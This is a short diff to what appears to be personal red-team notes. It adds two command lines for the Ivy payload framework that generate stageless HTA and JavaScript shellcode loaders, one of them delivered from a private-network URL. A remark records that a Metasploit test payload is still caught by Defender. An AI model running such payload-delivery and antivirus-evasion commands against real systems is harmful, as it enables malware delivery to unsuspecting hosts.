@@ -630,6 +630,17 @@ doesnt work out of the box
 
 https://github.com/optiv/Ivy
 
+`./Ivy -Ix64 test.bin -P Local -O test.hta -url http://10.10.6.156 -delivery hta -stageless`
+
+able to deliver but metasploit calc is caught by defender
+
+`./Ivy -stageless -Ix64 test64.bin -P Inject -O stageless.js`
+
+
+
+
+
+
 
 
 
